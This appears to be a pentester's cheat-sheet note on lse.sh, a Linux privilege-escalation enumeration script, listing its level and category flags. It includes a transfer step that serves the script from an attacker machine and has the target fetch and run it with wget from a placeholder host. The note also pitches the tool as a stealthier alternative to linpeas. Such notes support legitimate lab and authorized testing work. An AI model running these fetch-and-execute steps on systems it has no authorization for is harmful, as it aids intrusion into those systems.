---
tags: [tool, privesc, linux, enumeration]
tool: "lse"
category: "Privesc"
installed: true
phase: [enumeration, privesc]
---

# lse - Linux Smart Enumeration

## Tool Overview
Purpose: Quiet, controlled Linux privilege escalation enumeration
Location: ~/tools/privesc/linux/linux-smart-enumeration/lse.sh

## When to Use
- When linpeas is too noisy
- For stealthier enumeration
- When you want level-based checks

## How to Use It

Level 1 (Basic):
./lse.sh -l 1

Level 2 (Advanced):
./lse.sh -l 2

Check Specific Categories:
./lse.sh -c kernel
./lse.sh -c sudo

Transfer to Target:
On Kali: cd ~/tools/privesc/linux/linux-smart-enumeration && python3 -m http.server 8000
On target: wget http://YOUR_IP:8000/lse.sh && chmod +x lse.sh && ./lse.sh -l 2

## Levels Explained
Level 1: Basic system info, users, groups
Level 2: Advanced checks (cron, services, network)

## Related Tools
linpeas, pspy, les
